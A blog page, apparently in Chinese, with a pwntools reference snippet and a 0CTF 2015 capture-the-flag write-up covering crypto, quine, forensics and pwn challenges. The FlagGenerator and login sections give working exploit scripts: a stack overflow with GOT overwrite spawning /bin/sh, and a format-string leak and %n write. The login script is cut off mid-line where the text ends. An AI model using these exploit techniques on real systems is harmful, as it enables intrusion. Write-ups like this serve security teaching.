<h3 id="Assembly-and-Disassembly"><a href="#Assembly-and-Disassembly" class="headerlink" title="Assembly and Disassembly"></a>Assembly and Disassembly</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'mov eax, 0'</span>).encode(<span class="string">'hex'</span>)</div><div class="line"><span class="string">'b800000000'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> disasm(<span class="string">'6a0258cd80ebf9'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">   <span class="number">0</span>:   <span class="number">6</span>a <span class="number">02</span>                   push   <span class="number">0x2</span></div><div class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</div><div class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   int    <span class="number">0x80</span></div><div class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></div></pre></td></tr></table></figure>
<h3 id="Packing-Integers"><a href="#Packing-Integers" class="headerlink" title="Packing Integers"></a>Packing Integers</h3><p><code>p8()</code>, <code>p16()</code>, <code>p32()</code>, <code>p64()</code>, <code>u8()</code>, <code>u16()</code>, <code>u32()</code>, <code>u64()</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0xdeadbeef</span>) == struct.pack(<span class="string">'I'</span>, <span class="number">0xdeadbeef</span>)</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>leet = <span class="string">'37130000'</span>.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u32(<span class="string">'abcd'</span>) == struct.unpack(<span class="string">'I'</span>, <span class="string">'abcd'</span>)[<span class="number">0</span>]</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure>
<p><code>pwnlib.util.packing.pack/unpack(number, word_size = None, endianness = None, sign = None, **kwargs)</code></p>

                    
                        
                    
                    
                        <p>
                            <a href="/uncategorized/pwntools-quick-reference-guide/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/0ctf-2015-writeup/">
                            0CTF2015 Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2015-04-02T23:59:51+08:00">
	
		    Apr 02, 2015
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>没怎么做alictf，做了0ctf。渣渣又被虐了……分享下writeup……</p>
<h1 id="oldcrypto"><a href="#oldcrypto" class="headerlink" title="oldcrypto"></a>oldcrypto</h1><blockquote>
<p>Old crypto is not old enough to be broken. Notice: all in lowercase</p>
</blockquote>
<p>阅读这个是一个多表替换的密码，i两边是对称的，所以可以把i的变化去掉。这个有点类似维吉尼亚，不过代换是通过矩阵，而且是对称的。wiki下应该是<strong> 博福特密码</strong>。 解法跟维吉尼亚密码一样，wiki说有<em>卡西斯基试验</em>或者<em>弗里德曼试验</em>，重复指数的代码找不到了就用的卡西斯基试验的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def search():</div><div class="line">i = 0</div><div class="line">with open(&apos;deletei&apos;) as f:</div><div class="line">cipher = f.read().strip()</div><div class="line">while i &lt; len(cipher):</div><div class="line">now = cipher[i:i+3]</div><div class="line">find = cipher[i+3:].find(cipher[i:i+3])</div><div class="line">if find != -1:</div><div class="line">print cipher[i:i+3], find+3</div><div class="line">i += 1</div></pre></td></tr></table></figure></p>
<p>找出来发现很多很长的密文有重复且间隔都是20的倍数。所以猜测key是20位。 之后拆分成20组频率分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">def findk(src, des):</div><div class="line">for k in xrange(26):</div><div class="line">if tr[k][ord(des)-ord(&apos;a&apos;)] == ord(src)-ord(&apos;a&apos;):</div><div class="line">return chr(k + ord(&apos;a&apos;))</div><div class="line"></div><div class="line">def key():</div><div class="line">k = &apos;&apos;</div><div class="line">with open(&apos;split2&apos;) as f:</div><div class="line">for line in f:</div><div class="line">fre = &#123;&#125;</div><div class="line">line = line.strip()</div><div class="line">for c in line:</div><div class="line">if c in fre:</div><div class="line">fre[c] += 1</div><div class="line">else:</div><div class="line">fre[c] = 1</div><div class="line">sort_fre = sorted(fre.iteritems(),key=lambda fre:fre[1],reverse=True)</div><div class="line">k += findk(&apos;e&apos;, sort_fre[0][0])</div><div class="line">print k</div></pre></td></tr></table></figure>
<p>都猜测出现最高的频率的是’e’，之后算出来的key = ‘wkaszhcslciyhwrusfun’。解出来发现不对，不过感觉但是最后fun应该是对的。之后通过查看解密的文章通过手工判断（文章最后是flag，而且用了20个o方便判断）解出key = ‘classicalcipherisfun’ flag:<strong>0ctf{classicalcipherisfun}</strong></p>
<h1 id="BabyPolyQuine"><a href="#BabyPolyQuine" class="headerlink" title="BabyPolyQuine"></a>BabyPolyQuine</h1><blockquote>
<p>Different people see different me. But I am always myself. 202.112.26.114:12321 Make the output of your program exactly the same as your source code. At least 3 correct to get this flag $python2 –version Python 2.7.6 $python3 –version Python 3.4.0 $gcc –version gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2 $ruby –version ruby 1.9.3p484 (2013-11-22 revision 43786) [x86_64-linux] $perl –version This is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi</p>
</blockquote>
<p>维基百科搜到一个代码通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#include/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">main()&#123;char*_;/*=;sub _:lvalue&#123;$_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;</div><div class="line">def printf(a,*b):print a%b,</div><div class="line">q</div><div class="line">#*/</div><div class="line">_=&quot; #include/*%cq=&apos;&apos;&apos;*/%cmain()&#123;char*_;/*=;sub _:lvalue&#123;%c_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;%cdef printf(a,*b):print a%%b,%cq%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cq=&apos;&apos;&apos;*/%c&#125;//&apos;&apos;&apos;#=%c&quot;;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);</div><div class="line">#/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">&#125;//&apos;&apos;&apos;#=</div></pre></td></tr></table></figure></p>
<p>flag:<strong>0ctf{The very moment of raising beginner’s mind is the accomplishment of true awakening itself}</strong></p>
<h1 id="PolyQuine"><a href="#PolyQuine" class="headerlink" title="PolyQuine"></a>PolyQuine</h1><blockquote>
<p>BabyPolyQuine 满足 All 5 correct required to get this flag</p>
</blockquote>
<p>上面的代码在python3会出问题，尝试加上括号，不过python3会多打一个空行。所以想办法利用不打空行的打印函数，想到stdout.write()于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#include/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">main()&#123;char*_;/*=;sub _:lvalue&#123;$_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;</div><div class="line">def printf(a,*b):__import__(&apos;sys&apos;).stdout.write(a%b)</div><div class="line">q</div><div class="line">#*/</div><div class="line">_=&quot; #include/*%cq=&apos;&apos;&apos;*/%cmain()&#123;char*_;/*=;sub _:lvalue&#123;%c_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;%cdef printf(a,*b):__import__(&apos;sys&apos;).stdout.write(a%%b)%cq%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cq=&apos;&apos;&apos;*/%c&#125;//&apos;&apos;&apos;#=%c&quot;;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);</div><div class="line">#/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">&#125;//&apos;&apos;&apos;#=</div></pre></td></tr></table></figure></p>
<p>flag:<strong>0ctf{“Yields falsehood when preceded by its quotation” yields falsehood when preceded by its quotation}</strong></p>
<h1 id="x-y-z"><a href="#x-y-z" class="headerlink" title="x-y-z"></a>x-y-z</h1><blockquote>
<p>-4.751373,-2.622809,2.428588;-4.435134,-3.046589,2.406030;-4.788052,-2.661979,2.464709 -4.692748,-2.599611,2.629112;-4.656070,-2.560445,2.592991;-4.788052,-2.661979,2.464709 -4.692748,-2.599611,2.629112;-4.788052,-2.661979,2.464709;-4.435134,-3.046589,2.406030 -4.656070,-2.560445,2.592991;-4.516017,-2.714652,2.570303;-4.751373,-2.622809,2.428588 -4.656070,-2.560445,2.592991;-4.751373,-2.622809,2.428588;-4.788052,-2.661979,2.464709 -4.611258,-2.777269,2.405960;-4.435134,-3.046589,2.406030;-4.751373,-2.622809,2.428588 -4.572725,-2.644557,2.333280;-4.603014,-2.680354,2.364417;-4.592222,-2.663824,2.351891 -4.571442,-2.773632,2.381504;-4.564917,-2.826000,2.397583;-4.611258,-2.777269,2.405960 ……</p>
</blockquote>
<p>感觉应该是坐标点，加上题目x-y-z。猜测把点全部描出来会不会看到立体的flag。。。于是matlab画散点图（电脑不好真惨，把点去掉一部分画还是卡）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">A=[</div><div class="line">......</div><div class="line">];</div><div class="line">x=A(:,1);y=A(:,2);z=A(:,3);</div><div class="line">scatter3(x,y,z,&apos;.&apos;)</div></pre></td></tr></table></figure></p>
<p>慢慢的旋转猜出flag</p>
<h1 id="geo-newbie"><a href="#geo-newbie" class="headerlink" title="geo newbie"></a>geo newbie</h1><p>我的地理知识涨了不少</p>
<blockquote>
<p>Talentyange gives lots of tedious apks and you know how bad he is now. Let’s try some interesting geography knowledge. nc 202.112.26.111 29995 / nc 202.112.28.118 29995</p>
</blockquote>
<p>上去以后问你xxx是哪里的，用国家2字母简称表达。 前20轮给国家，21-70给地名，70-75问你河流或者山脉经过的国家。。。 前70用google map的geocoding api 后70轮用google+维基百科手动输入+自动缓存</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">from zio import *</div><div class="line">import re</div><div class="line">import requests</div><div class="line">import json</div><div class="line"></div><div class="line">correct = &#123;</div><div class="line">'Palestine, State of' : 'PS',</div><div class="line">'Norfolk Island':'NF',</div><div class="line">'Alexandria':'EG',</div><div class="line">'Antarctica':'AQ',</div><div class="line">'Micronesia':'FM',</div><div class="line">'Naples':'IT',</div><div class="line">'Mount Olympus':'GR',</div><div class="line">'Hyde Park':'GB',</div><div class="line">'Georgia':'GE',</div><div class="line">'Micronesia (Federated States of)':'FM',</div><div class="line">'Korea (Republic of)':'KR',</div><div class="line">'Holy See':'VA',</div><div class="line">'Tanzania, United Republic of':'TZ',</div><div class="line">'Macedonia (the former Yugoslav Republic of)':'MK',</div><div class="line">'Volga':'RU',</div><div class="line">'Lego':'DK',</div><div class="line">'Virgin Islands (British)':'VG',</div><div class="line">'Rickshaw capital of the world':'BD',</div><div class="line">'Melbourne':'AU',</div><div class="line">'Vancouver':'CA',</div><div class="line">'Korea (Democratic People's Republic of)':'KP',</div><div class="line">'Jiuzhaigou Valley':'CN',</div><div class="line">'Georgia':'GE',</div><div class="line">&#125;</div><div class="line"></div><div class="line">target = (('202.112.28.118',29995))</div><div class="line"></div><div class="line">def geo(query):</div><div class="line">url = 'http://maps.googleapis.com/maps/api/geocode/json?address=%s&amp;sensor=true_or_false' % query</div><div class="line">r = requests.get(url)</div><div class="line">result = json.loads(r.text)</div><div class="line"># print result</div><div class="line">for com in result['results'][0]['address_components']:</div><div class="line">if "country" in com['types']:</div><div class="line">return com['short_name']</div><div class="line"></div><div class="line">io = zio(target, timeout=100000,</div><div class="line">print_read=COLORED(REPR,'red'),</div><div class="line">print_write=COLORED(REPR,'green')</div><div class="line">)</div><div class="line"></div><div class="line"># level 1</div><div class="line">for i in range(70):</div><div class="line">buf = io.read_until(':')</div><div class="line">country_name = re.findall(r'n(.+)?:', buf)[0]</div><div class="line"># print country_name</div><div class="line"># country = pycountry.countries.get(name=country_name)</div><div class="line"># io.writeline(country_ascii2_dict[country_name])</div><div class="line">if country_name in correct:</div><div class="line">io.writeline(correct[country_name])</div><div class="line">else:</div><div class="line">io.writeline(geo(country_name))</div><div class="line"></div><div class="line"># load</div><div class="line">level2 = &#123;&#125;</div><div class="line">with open('level2') as f:</div><div class="line">level2 = json.loads(f.read())</div><div class="line"></div><div class="line">buf = io.read_until(':')</div><div class="line"># level 2</div><div class="line">try:</div><div class="line">for i in range(30):</div><div class="line">question = re.findall(r'n(.+)?:', buf)[0]</div><div class="line">if question in level2:</div><div class="line">ans = level2[question]</div><div class="line">else:</div><div class="line">ans = raw_input()</div><div class="line">ans = ans.strip().split(',')</div><div class="line">for c in ans:</div><div class="line">if c in correct:</div><div class="line">io.writeline(correct[c])</div><div class="line">else:</div><div class="line">io.writeline(geo(c))</div><div class="line">buf = io.read_until(':')</div><div class="line">level2[question] = ans</div><div class="line">except Exception, e:</div><div class="line">with open('level2','w') as f:</div><div class="line">f.write(json.dumps(level2))</div><div class="line">print e</div><div class="line">exit()</div><div class="line"></div><div class="line">with open('level2','w') as f:</div><div class="line">f.write(json.dumps(level2))</div><div class="line"></div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<p>flag:<strong>0CTF{eNj0y_geography_l0v3_7hE_w0lRd}</strong></p>
<h1 id="peers"><a href="#peers" class="headerlink" title="peers"></a>peers</h1><blockquote>
<p>peers :P 一个pcap文件</p>
</blockquote>
<p>打开发现是bt传输文件的流量。搜索下发现与<a href="http://eindbazen.net/2012/05/plaid-ctf-2012-torrent/" target="_blank" rel="external">Plaid CTF 2012 – Torrent</a>类似。 不过有个坑，就是用到80端口，wireshark把它认成了HTTP请求，影响了服务解析。只要把enable service里HTTP给去掉就好了。</p>
<blockquote>
<p>PS. 朋友圈看到有人把那个分片的传输数据剪出来拼起来了。给各位大神跪了。。。  <a href="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg" target="_blank" rel="external"><img src="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg" alt="peerliang"></a></p>
</blockquote>
<h1 id="FlagGenerator"><a href="#FlagGenerator" class="headerlink" title="FlagGenerator"></a>FlagGenerator</h1><blockquote>
<p>Can you generate the correct flag? flagen libc.so.6 202.112.26.106:5149 202.112.28.115:5149 Notice: Ubuntu 14.04.2 LTS</p>
</blockquote>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><pre><code>RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH flagen
</code></pre><p>这个是个花式flag生成器。问题出再fun4，把字符转成数字例如把’a’转成’4’，就比如yufan变成yuf4n(其实是用户名已注册…)。其中把h变化为’1-1’。一个字符变3个字符就栈溢出了。。。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用那个扩展在输入里填一些hhh就能造成溢出。就是有个canary。</p>
<pre><code>strcpy(dest, &amp;src);
return *MK_FP(__GS__, 20) ^ v18;
</code></pre><p>注意在之后有一个从栈里src考数据到分配的对指针dest的调用。dest是函数传进来的，栈溢出的时候可以改到。 利用步骤</p>
<ol>
<li>利用那个strcpy将GOT中check_stack_fail函数地址改掉绕过stack smash check，顺带将system地址覆盖GOT中atoi。(简单粗暴地爆破system地址)</li>
<li>栈溢出将eip控制到sub_804873E，直接利用atoi调用system(‘/bin/sh’)获得shell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">checkfail_got = <span class="number">0x0804B01C</span></div><div class="line">brute_system = <span class="number">0xf75de190</span></div><div class="line"></div><div class="line"><span class="comment"># target = ('./flagen')</span></div><div class="line">target = ((<span class="string">'202.112.28.115'</span>, <span class="number">5149</span>))</div><div class="line"></div><div class="line">copyto = <span class="string">''</span></div><div class="line">copyto += l32(brute_system)*<span class="number">10</span></div><div class="line"></div><div class="line">p = <span class="string">''</span></div><div class="line">p += l32(ret)</div><div class="line">p += copyto</div><div class="line">p += <span class="string">'a'</span>*(<span class="number">48</span> -len(copyto)<span class="number">-4</span>)</div><div class="line">p += <span class="string">'h'</span> * <span class="number">40</span> + <span class="string">'a'</span>*<span class="number">100</span></div><div class="line"></div><div class="line">p += l32(checkfail_got + <span class="number">4</span>) <span class="comment">#ebp</span></div><div class="line">p += l32(<span class="number">0x804873E</span>) <span class="comment"># eip</span></div><div class="line">p += l32(checkfail_got) <span class="comment"># dest</span></div><div class="line"></div><div class="line">cnt = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"><span class="keyword">print</span> cnt</div><div class="line">cnt += <span class="number">1</span></div><div class="line">io = zio(target, timeout=<span class="number">100000</span>,</div><div class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</div><div class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</div><div class="line">)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(p)</div><div class="line"><span class="comment"># io.gdb_hint()</span></div><div class="line">io.writeline(<span class="string">'4'</span>)</div><div class="line">io.writeline(<span class="string">'/bin/sh'</span>)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<p>flag:<strong>0ctf{delicious_stack_cookie_generates_flag}</strong></p>
<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><blockquote>
<p>Login as guest. Logout as root. libc.so.6 202.112.26.107:10910 202.112.28.116:10910</p>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>Notice: Ubuntu 14.04.2 LTS The process is protected by a sandbox. So you may not get a shell. The only thing you can do is reading the “flag”. If you want to break the sandbox, turn to task “0ops APP”.</p>
</blockquote>
<h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><pre><code>RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
Full RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH login
</code></pre><p>利用guest，guest123登陆。用户名用一个全局buffer存储，最后一位有个标志为初始设置成0。 之后可以通过fun2修改用户，而且可以修改到标志位。 然后可以用fun4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">void __noreturn fun4_sub_103B()</div><div class="line">&#123;</div><div class="line">__int64 v0; // rax@1</div><div class="line">__int64 strpt; // rsi@1</div><div class="line">__int64 v2; // rax@4</div><div class="line">__int64 v3; // rsi@4</div><div class="line">char v4; // [sp+0h] [bp-220h]@1</div><div class="line">char czUser; // [sp+10h] [bp-210h]@1</div><div class="line">char czPassword; // [sp+110h] [bp-110h]@1</div><div class="line">__int64 v7; // [sp+218h] [bp-8h]@1</div><div class="line"></div><div class="line">v7 = *MK_FP(__FS__, 40LL);</div><div class="line">printf(&quot;Login: &quot;);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czUser, 256);</div><div class="line">printf(&quot;Password: &quot;, 256LL);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czPassword, 256);</div><div class="line">v0 = strlen(&amp;czPassword);</div><div class="line">MD5((__int64)&amp;czPassword, v0, (__int64)&amp;v4);</div><div class="line">strpt = (__int64)&quot;root&quot;;</div><div class="line">if ( !strcmp(&amp;czUser, &quot;root&quot;) )</div><div class="line">&#123;</div><div class="line">strpt = (__int64)&quot;0ops&#123;secret_MD5&#125;&quot;;</div><div class="line">if ( !memcmp(&amp;v4, &quot;0ops&#123;secret_MD5&#125;&quot;, 16uLL) )</div><div class="line">showflag_sub_FB3();</div><div class="line">&#125;</div><div class="line">printf(&amp;czUser, strpt); // formatstring attack</div><div class="line">puts(&quot; login failed.&quot;);</div><div class="line">puts(&quot;1 chance remaining.&quot;);</div><div class="line">printf(&quot;Login: &quot;);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czUser, 256);</div><div class="line">printf(&quot;Password: &quot;, 256LL);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czPassword, 256);</div><div class="line">v2 = strlen(&amp;czPassword);</div><div class="line">MD5((__int64)&amp;czPassword, v2, (__int64)&amp;v4);</div><div class="line">v3 = (__int64)&quot;root&quot;;</div><div class="line">if ( !strcmp(&amp;czUser, &quot;root&quot;) )</div><div class="line">&#123;</div><div class="line">v3 = (__int64)&quot;0ops&#123;secret_MD5&#125;&quot;;</div><div class="line">if ( !memcmp(&amp;v4, &quot;0ops&#123;secret_MD5&#125;&quot;, 0x10uLL) )</div><div class="line">showflag_sub_FB3();</div><div class="line">&#125;</div><div class="line">printf(&amp;czUser, v3);</div><div class="line">puts(&quot; login failed.&quot;);</div><div class="line">puts(&quot;Threat detected. System shutdown.&quot;);</div><div class="line">exit(1);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>存在格式化字符串攻击</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序可以调用两次format string之后就调用exit(1)退出了。并且Full RELRO，所以可能的方法就是修改到libc加载的函数指针。提供方便的是程序里有打印flag的函数。 首先，通过调试发现寄存器里存在地址相关的信息，可以通过%016lx打印出来，栈相关的地址信息也有。程序加载的基址可以得到。栈里buffer的内容可以自己控制。通过读GOT表也能算出libc加载的基址和相对偏移。 要先写个程序把libc的相对偏移算出来。</p>
<blockquote>
<p>这边做的时候SB了看有提示ubuntu 14.04.2正好系统一样，就通过程序加载的地址直接算libc的基址，可能服务器有沙箱加载地址有变化结果本地可以远程一直不行……</p>
</blockquote>
<p>之后使用printf就通过%n修改libc的函数指针，之后就等flag了……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">dist_text_libcbasew = <span class="number">0x13acd000</span> - <span class="number">0x3be000</span></div><div class="line"></div><div class="line"><span class="comment"># target = ('./login')</span></div><div class="line">target = ((<span class="string">'202.112.26.107'</span>,<span class="number">10910</span>))</div><div class="line"></div><div class="line">io = zio(target, timeout=<span class="number">100000</span>,</div><div class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</div><div class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</div><div class="line">)</div><div class="line"></div><div class="line">io.writeline(<span class="string">'guest'</span>)</div><div class="line">io.writeline(<span class="string">'guest123'</span>)</div><div class="line">io.read_until(<span class="string">'Your choice:'</span>)</div><div class="line">io.writeline(<span class="string">'2'</span>)</div><div class="line">io.writeline(<span class="string">'a'</span>*<span class="number">256</span>)</div><div class="line">io.read_until(<span class="string">'Your choice:'</span>)</div><div class="line">io.writeline(<span class="string">'4'</span>)</div><div class="line">io.writeline(<span class="string">'%016lx%016lx%016lx'</span>)</div><div class="line">io.read_until(<span class="string">'Password: '</span>)</div><div class="line">io.gdb_hint()</div><div class="line">io.writeline(<span class="string">'1234'</span>)</div><div class="line"></div><div class="line">baddr = io.read(<span class="number">16</span>*<span class="number">3</span>)</div><div class="line"></div><div class="line">textbase = int(baddr[:<span class="number">16</span>],<span class="number">16</span>)</div><div class="line">textbase = textbase<span class="number">-0x1490</span></div><div class="line">retaddr = textbase - dist_text_libcbasew + <span class="number">0x38</span></div><div class="line"></div><div class="line"><span class="comment"># gen p</span></div><div class="line">sum = <span class="number">0</span></div><div class="line">p = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">t = (fun &gt;&gt; i*<span 